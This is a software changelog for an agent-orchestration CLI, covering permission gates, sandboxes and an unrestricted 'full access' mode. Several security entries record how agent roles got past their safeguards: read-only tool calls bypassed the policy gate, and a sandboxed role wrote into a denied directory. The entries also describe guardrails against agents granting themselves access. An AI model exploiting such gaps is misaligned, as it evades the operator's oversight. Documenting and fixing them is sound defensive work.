- **`monograph` no longer prints git's own errors in a repo with no commits** ([#371](https://github.com/monoes/monomind/issues/371)). `git rev-parse HEAD` (and the `git log`/`git status`/`git diff` probes) inherited the terminal's stderr, so `fatal: ambiguous argument 'HEAD'` showed up during `monograph watch` even though the failure was already handled as "freshness unknown".

### Internal

- `@monoes/monograph` bumped to 1.6.13.

## [2.18.0] — 2026-09-28

### Added

- **`monomind agent models --runtime <id> --json`** ([#369](https://github.com/monoes/monomind/issues/369)) — a runtime's own model list, so callers stop keeping hand-written lists that go stale. `claude` comes from the Agent SDK's `supportedModels()` (Claude Code's `/model` picker for the signed-in account; no prompt is sent), `codex` from `codex debug models`, `antigravity` from `agy models`, `opencode` from `opencode models`; other runtimes report `supported: false`. Each entry has `id`, `label`, and where known `resolved_id`, `description`, `default` and `effort_levels`. New capability `agent-models` (protocol §12, rev 14).

### Fixed

- **The statusline shows the installed version for a global `@monoes/monomindcli`** ([#368](https://github.com/monoes/monomind/issues/368)). A helper copied into a project only looked for a global `monomind` package and fell back to a made-up `v1.0.6`. It now also finds `@monoes/monomindcli` (on its own or nested under `monomind`), then asks `monomind --version`, and shows no version rather than a wrong one.
- **A session in a set-up folder no longer starts another dashboard server every turn** ([#366](https://github.com/monoes/monomind/issues/366)). When another project's dashboard held the default port, the server `control-start` spawned for the project came up as a secondary and wrote `dashboard-token-<port>`, so the next session could not authenticate to it, judged it stale, and spawned another — one more `monomind ui` per turn. A server `control-start` spawns now always takes the project's primary pairing file, `control-start` also accepts a port's own token, and it finds a globally installed `monomind` instead of falling back to a slow `npx monomind@latest`.
- **`agent exec --access full` no longer reports or kills monomind's own session-hook daemons** ([#366](https://github.com/monoes/monomind/issues/366)). The dashboard, helper self-heal, token tracker and monograph refresh spawns set `MONOMIND_EXEC_TREE` empty; a process carrying any other value than the turn's own has left its tree and is left out of `done.background_pids` and the cancel/timeout/budget kill.
- **No `CLAUDE_SDK_CAN_USE_TOOL_SHADOWED` warning on full-access turns** ([#366](https://github.com/monoes/monomind/issues/366)). Under `bypassPermissions` the SDK never calls `canUseTool`, so full access no longer passes one; the PreToolUse hook and the message stream still observe every call. A SIGTERM to monomind closes open `tool_activity` ids with `cancelled:true` before `done`, same as `cancel` (now covered by a test).
- **`org status --format json` reports `roles_access` for an org that has never run** ([#367](https://github.com/monoes/monomind/issues/367)), so a stopped org's full-access grants (active, never acknowledged, suspended, unattended-blocked) can be reviewed before it starts.

## [2.17.0] — 2026-09-28

### Added

- **`monomind agent exec --access full`** ([#355](https://github.com/monoes/monomind/issues/355)), part of the Coder mode epic ([#364](https://github.com/monoes/monomind/issues/364)). The `claude` runtime can now run a turn with unrestricted native tool access (`canUseTool` allows everything, `permissionMode: "bypassPermissions"`) instead of the default `scoped` allow-list — guarded against root, unsupported runtimes, and a missing/invalid `--cwd`. New capability `agent-exec-full-access` and `agent scan --json`'s `full_access` field.
- **`monomind agent exec --settings none|<csv of user,project,local>`** ([#356](https://github.com/monoes/monomind/issues/356)). A non-`none` value (claude runtime only) loads the normal Claude Code setup for the turn — CLAUDE.md, skills, hooks, and project/user MCP servers — and appends the caller's system prompt to Claude Code's own preset instead of replacing it; `--settings none` (default) stays byte-identical to before. New `status` NDJSON event reports SDK startup progress, and a `--startup-timeout` watchdog (default 30s) reports a clear error instead of hanging if the SDK never reports ready. Capability `agent-exec-settings`.
- **`monomind agent exec` emits `tool_activity` start/end events for the agent's own native tool calls** ([#357](https://github.com/monoes/monomind/issues/357)), capability `agent-exec-tool-activity`. Previously only `--tools stdio` bridged calls were visible on stdout; native calls (Bash, Edit, Write, Read, …) now get matched, size-capped events correlated by the SDK's own tool_use id, in every access mode. `Edit`/`MultiEdit` carry `old_string`/`new_string`, `Write` carries `file_path`/`content`; a denied call (scoped mode) closes with `ok:false, denied:true`; a `--timeout` or `cancel` closes any still-open call with `ok:false, cancelled:true` before `done`. `parent_tool_use_id` nests subagent calls. Non-Claude runtimes map their own best-effort liveness signal to a start-only event; `agent scan --json` reports each runtime's fidelity as `tool_activity_fidelity`.
- **`monomind init --project <dir> --if-missing --json`** ([#358](https://github.com/monoes/monomind/issues/358)) — headless, idempotent workspace init for coder sessions. `--project <dir>` targets a directory other than the cwd; `--if-missing` creates only files that don't exist yet and never touches an existing `CLAUDE.md`/`AGENTS.md`/`.claude/settings.json`/`.mcp.json` (idempotent — a second run creates nothing); `--json` prints `{root, created, skipped, claude_project_registered, duration_ms}` on stdout with human output suppressed; `--no-graph` skips the Monograph build for a faster init; `--register-claude-project` best-effort registers `~/.claude/projects/<slug>/` without a model call. New capability `init-json` — see `doc/agent-exec-protocol.md` §11.
- **Coder mode threat model + guardrails** ([#360](https://github.com/monoes/monomind/issues/360)). `agent exec --access full` now appends a one-line JSON audit record per turn (`ts, cwd, runtime, session_id?, exit_code, tool_calls`) to `~/.monomind/logs/agent-exec-full-access.log` (`MONOMIND_FULL_ACCESS_LOG` overrides), regardless of how the turn ended — never for `scoped` access, and best-effort (a write failure never fails the turn). No MCP tool, org-runtime session, workflow/routine node, UI route, or hook can set or raise `access: "full"` — audited and pinned by regression tests. New threat-model doc: `doc/concepts/coder-mode-security.md`.
- **Coder mode for a specific org role — `policy.access: "full"`** ([#365](https://github.com/monoes/monomind/issues/365), part of the Coder mode epic [#364](https://github.com/monoes/monomind/issues/364)), capability `org-role-full-access`. A role can now run with the same unrestricted native tool access as `agent exec --access full` — no allow-list, no OS sandbox, no authority mask, no per-tool approval gate; budgets are still enforced. It is **human-only, opt-in per role**: `monomind org role set-access <org> <role> full|scoped` refuses outright when it detects an agent-context env var (`CLAUDECODE`, `CLAUDE_CODE_ENTRYPOINT`, `MONOMIND_ORG_ROLE`, `MONOMIND_SDK_AGENT`, or the new `MONOMIND_AGENT_EXEC` set on `agent exec`'s runner child env) — not overridable by `--yes-i-understand` or a TTY — so a scoped chat/org can't reach a grant through an allowed `monomind org …` Bash prefix; outside that, `full` needs an interactive confirmation or `--yes-i-understand`. It is the only place that writes `access_ack`, which now carries both a `hash` over the role's security-relevant config (prompt, runtime, model, tool providers, `reports_to`, coder-mode settings, plus the org's unattended/taint knobs) and a `sig` — an HMAC-SHA256 of that hash under a machine-local key created on first grant and stored in the operator-credential directory, which every scoped/sandboxed role is denied Read/Edit on, so a config-writing path that can merely recompute the public `hash` still can't forge a grant the runtime will honor. The runtime verifies `sig` (timing-safe) before ever trusting `hash`, and recomputes both every session start: no signature, an invalid one, or a covered field changing since the grant drops the role to scoped (`access_state: "suspended"`); a scheduled/daemon run without `run_config.allow_unattended_full_access` also runs it scoped (`"unattended-blocked"`). `org validate` now errors on an unsupported runtime, a `policy.git` explicitly authored below `push` alongside `access: "full"`, and taint — a full-access role that itself ingests untrusted input, or is reachable from one via `reports_to`, unless the path is named in `run_config.accept_full_access_taint`. Taint errors are also checked at every session start, so a role that becomes reachable from untrusted input after its grant runs scoped. `org status --json` gains `roles_access` for any role that declares it.
- **`monomind agent exec --access full` now kills the whole agent process tree on Stop/timeout/budget, and reports background survivors** ([#359](https://github.com/monoes/monomind/issues/359), part of the Coder mode epic [#364](https://github.com/monoes/monomind/issues/364)). The `claude` CLI is now spawned as the leader of its own process group; a `cancel` frame, `--timeout`, or `--budget-usd` breach SIGTERMs (then SIGKILLs after a 5s grace) the WHOLE tree, not just the CLI process. A single point-in-time check turned out to be insufficient against the real, installed Claude Code CLI (live-verified during development): it spawns each Bash-tool shell call as the leader of its OWN process group, and that shell — or a background job's whole launching chain — often exits within milliseconds of starting the job. `orgrt/process-tree.ts`'s `trackDescendants` now finds the turn's processes by a per-turn `MONOMIND_EXEC_TREE` env marker every descendant inherits (so a `nohup … &` job reparented after its shell exited is still found, regardless of timing), plus continuous 50ms sampling that remembers every process-group id it saw, for jobs that clear their own environment. On a normal `end_turn`, background jobs are left running (the "start a dev server, use it next turn" flow still works) but now reported: `done` gains `background_pids: number[]`. Residual, documented v1 limitation: a job that clears its environment AND whose launching chain exited between samples can still go undiscovered. Implemented at the `ClaudeAgentRunner` layer, so a future full-access org role ([#365](https://github.com/monoes/monomind/issues/365)) gets the same protection automatically. Scoped mode is unaffected. Windows falls back to `taskkill /T` for the kill and does not yet support `background_pids` discovery (omitted, not fabricated as empty). New capability `agent-exec-background-pids`.

### Fixed

- **`agent exec --tools stdio` honors a `cancel` frame even when no tools are declared.** stdin was only read when a tools file or tool names were given, so a caller's `cancel` was silently ignored and the turn ran on.
- **A second dashboard server no longer takes over the first one's pairing token when the first is too busy to answer.** A secondary decided whether the primary recorded in `.monomind/control.json` was alive only by probing its `/api/status` (3 tries, 1.5 s each); a primary whose event loop was blocked longer than that looked dead, so the secondary overwrote `dashboard-token` — logging out the primary's clients — and never wrote its own `dashboard-token-<port>`. A live recorded pid now also keeps it a secondary.

## [2.16.19] — 2026-09-27

### Fixed

- **The `monodesign_detect` MCP tool now reports what `monodesign detect` does for HTML** ([#353](https://github.com/monoes/monomind/issues/353)). It ran the regex text engine on every file and on inline content, so HTML lost every cascade-dependent finding (low contrast, computed sizes) and could return 0 findings where the CLI reported some. HTML files and inline HTML now go through the static-HTML engine like the CLI; inline findings keep the caller's virtual path.
- **`check-package-bumps.mjs` no longer demands a version bump for a package whose only change is its top-level `README.md`** ([#354](https://github.com/monoes/monomind/issues/354)). The markdown exclude matched only files at least one directory deep.

## [2.16.18] — 2026-09-27

### Fixed

- `scripts/sync-claude-trees.mjs` now creates files missing inside a skill directory when the `.agents`/`.gemini` mirrors already hold that skill (previously silently left dangling imports to files that were never copied over).

### Internal

- File-size sweep wave 2: split ~95 oversized source files across the CLI, mcp-tools, orgrt, memory, init packages and the @monoes/monodesign, @monoes/memory, @monoes/monobrowse, @monoes/monograph, monofence-ai siblings into smaller modules. Pure code reorganization — original paths re-export everything, no behavior change.

## [2.16.17] — 2026-09-27

### Fixed

- **The sandbox-stub crash ledger no longer keeps a killed sandboxed runtime's entries forever.** An org runtime started inside a role's sandbox (a QA drill) runs in its own pid namespace; when it is killed before its cleanup, other runtimes left its entries alone because a pid in another namespace cannot be checked, so they accumulated (18 after the 2.16.16 release run). A runtime in the initial pid namespace — which sees every process — now reclaims such entries once no process of that namespace is left; a runtime inside a sandbox still leaves them alone.

## [2.16.16] — 2026-09-27

### Fixed

- **Sandboxed org roles no longer fail a Bash call on `~/.claude/.claude.json`.** The SDK binds `.claude.json` and its three OAuth-profile siblings next to whichever global config the Claude CLI picked — with a legacy `~/.claude/.config.json` that is `~/.claude/` — and created and deleted empty mount-point stubs there per command, so one role's cleanup could remove the file while another role's bwrap was binding it (`bwrap: Can't find source path ~/.claude/.claude.json`, 2.16.15 release run). Without `CLAUDE_CONFIG_DIR` the CLI never reads those four files in `~/.claude/` (its config is `~/.claude/.config.json` or `$HOME/.claude.json`), so the runtime now holds them for the whole run like its other stubs; with `CLAUDE_CONFIG_DIR` set they can be the live config and stay with the SDK.

## [2.16.15] — 2026-09-27

### Added

- **Org runs record the idle watchdog's state when they stop.** The `org stopped` event in `bus.jsonl` now carries `data.idleWatchdog`: `idle_minutes`, when the next idle nudge was due (`next_nudge_at`), when the run would have been idle-stopped, and any hold in force. `idle-watchdog.json` (read by `org status --json`) also gains `next_nudge_at`. Before this, a run that was cut short, for example a drill bounded by `timeout`, deleted the watchdog file on stop, and its bus did not show whether a nudge had been missed or simply was not due yet. The default nudge comes after 10 idle minutes. The 5-minute interval is `block_recheck_minutes`, which applies only to tasks blocked with `org_task_block`. (#352)

### Fixed

- **Two `browse open` launches racing for the same CDP port no longer end up sharing one Chrome.** Both launches could see the port as free and start Chrome on it. If the losing launch's Chrome was still starting when the winner's began answering, the loser took the winner's browser as its own and returned the same port. It then recorded its own Chrome's pid, which was about to exit, under that port. Both callers then drove one browser, and the winner's Chrome was left running with nothing able to close it. On a fixed port, a launch now accepts an endpoint only when it reports the browser id that its own Chrome printed on stderr (`DevTools listening on ws://…/devtools/browser/<id>`). If another Chrome holds the port, the launch waits for its own Chrome to lose the bind and moves on to the next port. Each launch now gets its own profile directory, even when two launches run in the same process. A launch that gives up now kills the Chrome it started, on a fixed port as well as on port 0. Bumped `@monoes/monobrowse` to 1.0.26.

## [2.16.14] — 2026-09-27

### Internal

- **Split large CLI/orgrt modules into smaller files for maintainability; no behavior change.** `org.ts`/`org-observe.ts` were split into `commands/org-*.ts` modules, and `daemon.ts`/`session.ts` were split into `orgrt/session-*.ts` modules, with doc source-anchors updated to point at the new module locations. This range is entirely behaviour-preserving internal refactors plus doc-anchor updates; confirmed by this round's pre-audit with no functional or user-facing change.

## [2.16.13] — 2026-09-27

### Fixed

- **`browse open` no longer rejects the Chrome it just started on a busy machine.** Once Chrome's CDP endpoint answered, the launcher checked `/json/version` with a 1 s timeout and treated a timeout as "not Chrome". A Chrome that had only just started, on a loaded CI runner, answered `/json/list` but missed that timeout, and `open` failed with "Port N is occupied by a CDP-speaking process that does not identify as Chrome/Chromium" for its own browser. This made the `#318 concurrent browse sessions` test flaky on CI. A timeout or a failed request now means "try again" until the launch deadline. Only an endpoint that answers as another browser is refused, and a port-0 launch now also kills the Chrome it refused instead of leaving it running.
- **`init` no longer downloads the published monomind package, and Chrome with it, into `$HOME`, and it no longer leaves npm running after it exits.** Its "Starting services" step ran `npx monomind@latest swarm init`. That step could never succeed: `swarm` was renamed to `monoswarm`, so it always ended with "Unknown command" and printed "Swarm initialization skipped". Before failing, it installed the whole published package from the registry (about 30,000 files) and ran that package's install scripts, which include puppeteer downloading two Chrome builds into `~/.cache/puppeteer`. On a cold npm cache this cost tens of seconds on every `init`. The 30-second timeout did not limit it, because npm postpones SIGTERM until the current install step finishes (one run took 105 s). When `init` itself was killed partway through, for example by a caller's timeout, npm and puppeteer's installer kept running and writing into `$HOME`. They even recreated a home directory that had already been deleted, with 261 MB of Chrome in it. This caused the intermittent `ENOTEMPTY` failures in `init-watch-non-interactive.test.ts`'s cleanup. `init` no longer runs this step. Run `monomind monoswarm init` when you need a swarm.

## [2.16.12] — 2026-09-26

### Fixed

- **The org runtime no longer removes an empty file someone else recreated where one of its sandbox stubs was.** A stub was recognised by device and inode only, and a filesystem reuses a freed inode at once, so an empty file recreated at the same path (an SDK stub, a user's placeholder) passed as the runtime's own and was deleted when the run ended. A file stub now also records its ctime at creation (ledger entries too), so a replaced or re-chmodded file is left alone. This also made the `Tests` workflow fail on every push since 2.16.10.

- **`cleanup --data --force` could corrupt `~/.monomind-projects.json` if interrupted mid-write.** It rewrote the registry file in place; it now writes through the same atomic temp-file-then-rename helper `init` uses. The dry run and the forced run also now report project-data folders and pruned registry entries as separate counts instead of one combined total.

## [2.16.11] — 2026-09-26

### Fixed

- **A sandboxed org role could create new files in the org root it was told not to write.** In the 2.16.10 release run, a QA role with `policy.sandbox.denyWrite: ["."]` (the org root, which is also its cwd) wrote a new file, `qaSample.js`, into the org root with Bash. Since #323 a denied directory that is or holds the cwd went to the SDK sandbox as its existing children, each read-only. The directory itself became a writable mount point, because bubblewrap had to create the SDK's empty mount-point files in it. The runtime now creates those files itself before the role's restrictions are built, and keeps them for the whole run. With every one of them in place in the cwd, the cwd goes to the SDK as a plain read-only deny again: `touch newfile` fails with "Read-only file system", while reads, `ls` and `git status` still work and bubblewrap starts cleanly. If a stub is missing (it could not be created, or another process made it and may remove it), the cwd falls back to the #323 expansion. The org root above a cwd in a checkout below it, and `~/.claude`, keep the #323 expansion. The file tools (`Write`/`Edit`) were never affected. Verified against the real bundled CLI and bubblewrap. See [Git policy enforcement](doc/concepts/org-runtime.md#git-policy-enforcement).

## [2.16.10] — 2026-09-26

### Fixed

- **The sandbox-stub crash ledger's `reclaim()` could wrongly treat a live entry as dead, because `alive()` was not pid-namespace aware.** The Claude SDK sandbox runs every org role under `bwrap --unshare-pid`, so a role sees its own private pid namespace, not the host's: `process.kill(pid, 0)` on a pid recorded by another role (or the host daemon) always throws ESRCH, whether that process is alive or not, because the pid simply is not visible from inside the caller's namespace. `reclaim()` read that ESRCH as "dead" and freed the entry's stubs — so a sandboxed role's own crash/recovery drill calling `reclaim()` could empty `~/.monomind/orgrt-sandbox-stubs/ledger.json` mid-run while the run's real daemon and its stubs were still alive. Each ledger entry now also records the writer's pid namespace (`/proc/self/ns/pid`) and the machine's boot id (`/proc/sys/kernel/random/boot_id`, stable for one boot, never reused after a reboot). `reclaim()` now only treats an entry as reclaimable when it is either from a different boot (the machine rebooted, so no pid from that boot can still be alive) or from the same boot AND the same pid namespace with a pid that fails the liveness check; an entry from the same boot but a different (or unreadable) pid namespace is left alone, since its liveness cannot be determined from here. Entries written before this change (no `pidNamespace`/`bootId` fields) keep the old bare-pid behavior.

- **Sandboxed org roles no longer fail Bash calls with `bwrap: Can't find source path …`.** Every recent release run had 0–5 of these (`~/.claude/local`, `<org root>/.claude/settings.local.json`), each audited as a `sandbox-fault`. For a missing "dangerous file" (`.bashrc`, `.mcp.json`, `.claude/settings.local.json`, `~/.claude/local`, …), the SDK sandbox has bubblewrap create an empty mount-point file, and deletes it when that command ends. It coordinates this only within one process, and every role is its own process. So a role that wrapped a command while another role's stub existed bound the stub as a real file, and the other role's cleanup deleted it before bubblewrap started. Before a sandboxed role starts, the runtime now creates each of those paths that is missing, as the same empty read-only file, and keeps it until the run stops. The SDK never deletes a path that already existed. At the end the runtime removes only the files and `.claude/` directories it created, and only while they are unchanged. Pre-existing files are never touched. A per-machine ledger (`~/.monomind/orgrt-sandbox-stubs/ledger.json`) lets the next runtime reclaim, under the same rule, the stubs of a daemon that was killed or a machine that rebooted mid-run. Verified against the real bundled CLI with two concurrent role processes. See [Git policy enforcement](doc/concepts/org-runtime.md#git-policy-enforcement).
- **Every push to main now gets a Deploy Pages run** ([#348](https://github.com/monoes/monomind/issues/348)). `pages.yml` filtered pushes by `paths: ['doc/**', ...]`, so a push that changed no doc file got no run at all. The 2.16.8 release push (`d09b3ecdd..803111a67`, only `CHANGELOG.md` and the `package.json` versions) was one of these: `d09b3ecdd` and its doc changes had already been pushed and deployed. The release rules then found no pages run for the release commit, and the publisher had to dispatch one by hand. The trigger no longer has a path filter. A `changes` job diffs `github.event.before..github.sha` and runs the deploy job only when `doc/**` or `pages.yml` changed. A new branch, a force push or a `before` that cannot be fetched always deploys, and so does `workflow_dispatch`. A push with no doc change now ends as a successful run with the deploy job skipped.
- **`cleanup --data` prunes project data whose whole parent tree was deleted, and prunes the project registry.** A `~/.monomind/projects/<name>-<hash>` folder counted as orphaned only when its project's parent directory still existed, so a project inside a deleted test root (`/var/tmp/fx-init/agent-ops-test-*` after `/var/tmp/fx-init` was removed) was kept forever, and `--aggressive` did not help. The check now walks up to the nearest directory that still exists. The folder is pruned unless that directory is a mount point or a removable-media directory (`/Volumes`, `/media`, `/mnt`, `/run/media`), where the project may be on a volume that is not mounted. The home directory, `/tmp`, `/var/tmp` and the OS temp directory count as local. `cleanup --data` also lists `~/.monomind-projects.json` entries whose project was deleted by the same rule, and removes them with `--force`. The CLI test suite now points `HOME` and the global brain at a temp directory, so test runs no longer leave folders in `~/.monomind/projects` (#347).

## [2.16.9] — 2026-09-26

### Fixed

- **Security: every tool call of a Claude org role is now decided by the role's policy.** The Claude Code CLI asks the org's `canUseTool` gate only about calls its own rules would ask about. Read-only Bash (`cat`, `ls`, `grep`, `git status`, `git log`), `Read` inside the cwd, `Agent`, `ToolSearch` and `ListAgents` ran without it, so for those calls `denyTools`, `allowTools`, `fileRead` scopes, budget exhaustion, a pending decision gate, the fence and approvals did not apply, and no `tool` audit event was written. The 2.16.7 release run had 959 Bash results against 655 Bash decisions, and 38 `ToolSearch`, 7 `ListAgents` and 6 `Agent` calls had no decision at all. Reproduced against the real CLI: a role with `denyTools: ["Bash"]` could still run `cat`, and a role with `fileRead: ["docs/**"]` could still `Read` any file in its cwd. Write-type calls were not affected: `git commit` in a `git: 'read'` role, writes and non-read-only Bash always reached the gate, and the OS sandbox and git guard held underneath. The gate now also runs from a `PreToolUse` hook, which fires for every call, including a subagent's calls. A call is decided and audited once even when the CLI also asks `canUseTool`. `ToolSearch` is exempt from `allowTools`, since it only loads tool schemas; `denyTools` still blocks it. Approvals now cover these calls too: a role whose `Bash` needs approval (the default, unless `autoApproveTools` lists `Bash` or the run passes `--auto-approve Bash`) now also waits for approval of read-only commands. See [Where the policy is enforced](doc/concepts/org-runtime.md#where-the-policy-is-enforced-claude-runtime).
- **Org tools reject argument keys they do not declare.** The 2.16.7 release run's captain passed `org_plan_graph` nodes `deps` (org_task's field) instead of `after`. The schema stripped the unknown key, the graph was accepted with no edges, every node came back ready, and QA was dispatched before the build. Every built-in org tool (`org_*`, `ask_human`, `knowledge_search`) now refuses unknown keys, at the top level and in nested objects, with an error that names each key and changes nothing. `deps` on a plan-graph node is pointed to `after` with node names, and `after` on `org_task` to `deps` with task ids. The tool schemas now advertise `additionalProperties: false`, so the model sees the rule before it calls. Tool-provider tools keep their `inputSchema` behaviour (#325).

## [2.16.8] — 2026-09-26

### Added

- **The coordinator is warned at 80% of a role's token cap and of the org-wide `run_config.budget_tokens`.** (Follow-up to [#343](https://github.com/monoes/monomind/issues/343)) The one-time 80% warning previously covered only `budget_usd`. It now also fires once per role per run at 80% of the role's token cap (its own `budget_tokens`, or its even split of `run_config.budget_tokens`, on whichever basis the cap is enforced on), and once per run when the whole run passes 80% of `run_config.budget_tokens`. Each warning is a `budget-warning` audit event whose `data.budget` names the budget (`budget_usd`, `budget_tokens` or `run_config.budget_tokens`). See [Budget-closed assignees](doc/concepts/org-runtime.md#budget-closed-assignees).

### Changed

- **MCP result shape: `hooks_session-start` drops fields that never held real values.** (Follow-up to [#341](https://github.com/monoes/monomind/issues/341)) The `config` block (`intelligenceEnabled`, `hooksEnabled` and `memoryPersistence`, all always `true`) and `sessionMemory.restoredPatterns` (always `0`) are gone. `previousSession` no longer has `id`, `tasksRestored` or `memoryRestored`; it now carries the loaded session's `sessionId`, `status`, `startedAt` and, when present, `endedAt`, `summary` and `metrics`.

### Fixed

- **`hooks_session-start` with `restoreLatest` reports the previous session it actually found.** (Follow-up to [#341](https://github.com/monoes/monomind/issues/341)) It returned `restored: true` whenever `restoreLatest` was set and a `previousSession` whose id was made up from the current time minus one day, without looking anything up. It now reads the most recently started session from the `sessions` store that `hooks_session-end` updates. It reports `restored: true` and that session's record only when one exists, and `restored: false` with `previousSession: null` otherwise. The session being started is never reported as its own previous session.
- **`hooks_model-outcome` reports `recorded: false` when the ledger write fails.** ([Fixes #346](https://github.com/monoes/monomind/issues/346)) `recordModelOutcome` swallowed every error and the tool always returned `recorded: true`, so an unwritable `.monomind/neural/` or a full disk dropped the outcome without anyone knowing. `recordModelOutcome` still never throws, but it now resolves to whether the line was appended, the tool reports that, and `hooks model-outcome` prints a warning instead of "Outcome recorded" when the write failed.
- **Four more hooks tools stop reporting writes that did not happen.** (Follow-up to [#346](https://github.com/monoes/monomind/issues/346)) `hooks_post-task` set `learningUpdates.outcomePersisted: true` even when writing `.monomind/routing-outcomes.json` failed. `hooks_session-end` and `memory_session-end` reported the session end as persisted when no session with that id had been started, which is every `hooks session-end` run, since the command passes no session id; they now report `persisted: false` / `success: false`. `hooks_intelligence-reset` returned `reset: true` when some learning files could not be deleted; it now returns `reset: false` with a `failedFiles` list, and `hooks intelligence --reset` warns and names them. `hooks_pretrain` counted `neuralPatternsLearned` even when recording the trajectory failed; it now reports 0.
- **`org reload` reopens roles the org-wide `run_config.budget_tokens` ceiling closed.** (Follow-up to [#343](https://github.com/monoes/monomind/issues/343)) A reload that raised the ceiling above the run's total spend could not reopen the roles it had closed; their tasks stayed `blocked` with "org-wide budget_tokens exhausted" for the rest of the run. Raising `run_config.budget_tokens` above the run's total spend now re-arms the ceiling at the new value, reopens those roles with their spend kept, restores any roles that had been held back from spawning, and re-dispatches their held tasks (`org-budget-reopened` audit event); a raise that is not enough keeps them closed and updates the numbers in the held tasks' reason. A reload also recomputes the token cap of every live role that uses the org's even split, so a changed `run_config.budget_tokens` or a role gaining or dropping its own `budget_tokens` moves the other roles' shares too. See [Budget-closed assignees](doc/concepts/org-runtime.md#budget-closed-assignees).
- **`pick` no longer mis-routes tasks that mention "org" or API documentation.** Keyword picks showed `monoswarm-multi-repo` for tasks like "set up an org that tracks competitor pricing changes" — its description said "many repositories in an org", which matched monomind's own meaning of "org" (an agent organization); it now says "GitHub repositories" / "GitHub repos". `api-designer` showed up for "document the public REST API for external developers" because it carried the `documentation` tag, which is reserved for technical docs, READMEs, ADRs and changelogs; that tag is dropped, since `api` already covers it. `code-documenter`'s description now names the API reference docs and tutorials its skills actually cover.
- **Editing a bundled org skill in place is picked up without another change.** `.claude/helpers/skill-registry.json` compared the bundled `org-skills/` library by directory mtime only, so editing an existing bundled `SKILL.md` left the index looking fresh and the prompt hook, `monomind pick` and the `pick` MCP tool kept ranking the old description and tags until something else touched the directory. The bundled root now gets the same per-skill scan as project and user org skill roots.

## [2.16.7] — 2026-09-26

### Changed

- **MCP result shape: `hooks_*` tools no longer send placeholder fields.** (Follow-up to [#341](https://github.com/monoes/monomind/issues/341)) These fields held a fixed value rather than anything measured, and are removed: `hooks_pre-edit` `context.patterns` (always one 85% `<ext> file editing` row) and `context.relatedFiles` (always empty); `hooks_model-route` `confidence` (always 0.7; the keyword heuristic has no confidence score); `hooks_post-task` `learningUpdates.patternsUpdated` and `newPatterns` (derived from the success flag, not counted) and `learningUpdates.trajectoryId` (a new id each call, with no trajectory recorded); `hooks_session-end` `statePath` (a `.claude/sessions/*.json` path that was never written) and `summary.filesModified` (always 0); and `hooks_post-edit` `learningUpdate` (a fixed `pattern_reinforced`/`pattern_adjusted` label). The CLI commands and the hooks docs no longer read or describe them.

### Fixed

- **`hooks_pre-edit` `fileExists` and `hooks_post-edit` `recorded` report what actually happened.** (Follow-up to [#341](https://github.com/monoes/monomind/issues/341)) `fileExists` was always `true`; it now checks the path against the project directory, and `hooks pre-edit` prints `Exists: Yes` or `No` again. `recorded` was always `true`, even when the learning-feedback write, the hook's only write, failed; it now follows that write, and `hooks post-edit` warns when nothing was recorded.
- **`hooks post-command --success false` is recorded as a failure.** (Follow-up to [#341](https://github.com/monoes/monomind/issues/341)) The `hooks_post-command` tool looked only at the exit code, so a command reported with `--success false` and the default exit code 0 was stored as a success, and `post-task` then counted it as the task's final successful command. An explicit `success: false` now wins; a non-zero exit code is still always a failure. The tool's input schema documents `success`, and the CLI says whether the outcome was recorded as a success or a failure.
- **The other `hooks` subcommands now print only values their MCP tool actually returns.** (Follow-up to [#341](https://github.com/monoes/monomind/issues/341)) Each command kept its own copy of its tool's result shape, and several no longer matched the tool. `session-end` printed `NaN min`, `undefined` for tasks succeeded and failed, a blank commands count, `Files Modified: 0` every time, and a `.claude/sessions/*.json` path that is never written. It now prints tasks, agents, patterns, trajectories, pending insights and memory entries, and whether the session state was saved. `transfer from-project` crashed on the skipped-counts table the tool never returns, even after copying the patterns; it now prints the transferred count by type, or the tool's error. `explain` printed `0.00` for factors the tool has no value for, including Historical Success with no history; they now show `N/A`. `model-stats` printed average complexity, average confidence and circuit-breaker trips as 0 every time; it now prints the success rate and average quality from the outcome ledger. `post-edit` and `post-command` never printed their learning-updates block; they now say whether the feedback was recorded, and the exit code and store the command outcome went to. Fixed placeholders are no longer shown as data: `pre-edit`'s `Exists: Yes` and 85% "Learned Patterns" row, `model-route`'s fixed 70% confidence, and `intelligence`'s HNSW dimension (384) and 0% embedding cache hit rate. `pretrain` no longer says semantic search was enabled when it indexed nothing. `--format json` still prints each tool's result unchanged, except `intelligence`, which builds its own object and drops the same two placeholder fields.
- **Kimi conversion reports a command whose flow skill would take an earlier command's `.kimi-code/skills/<name>/` directory.** ([Fixes #342](https://github.com/monoes/monomind/issues/342)) The converter kept the first flow skill and dropped the later one without a note in `result.skipped`. It now lists the later command there, as it already did for plugin-command filename collisions. Flow-skill names and plugin-command filenames share one slug today, so the plugin-command check already caught every such pair; the new check keeps collisions reported if the two names ever diverge.
- **`hooks post-task` no longer prints `Agent patterns updated: undefined` and `Strategies learned: undefined`.** ([Fixes #341](https://github.com/monoes/monomind/issues/341)) The command read `agentPatternsUpdated`, `taskStrategiesLearned` and `complexityModelUpdated`, which the `hooks_post-task` MCP tool no longer returns, so the first two printed `undefined` and the complexity line always said `No change`. It now prints what the tool actually recorded: `Learning feedback: recorded (sqlite)` or `not recorded`, and whether the routing outcome was saved. `--format json` and the MCP result were not affected.
- **An interrupted `monograph watch` no longer blocks the next run with "Rebuild deferred — another build is in progress".** ([Fixes #340](https://github.com/monoes/monomind/issues/340)) A rebuild blocks the event loop until it ends, so the Ctrl+C listener in `watch` only ran after the rebuild. The interrupted `watch` kept building and holding the build lock (`.monomind/monograph.db.build-lock`), and the next `watch` deferred to it. `watch` now removes that listener while a rebuild runs. Ctrl+C during a rebuild exits at once, as it does for `monograph build`, and the next build takes over the dead process's lock. Ctrl+C between rebuilds still prints "Watch stopped." A build that ends through `process.exit()`, such as an MCP server shutting down, now removes its lock. It only removes a lock it still owns. The next build also takes over a lock that predates the last boot (a recycled pid), or one the holder has not refreshed for 30 minutes. The deferred line now names the holder (`pid 1234, running 2m`). After 10 minutes of deferral the watcher stops retrying and says which pid and lock file block it. The changed files are rebuilt on the next change. `@monoes/monograph` 1.6.11.
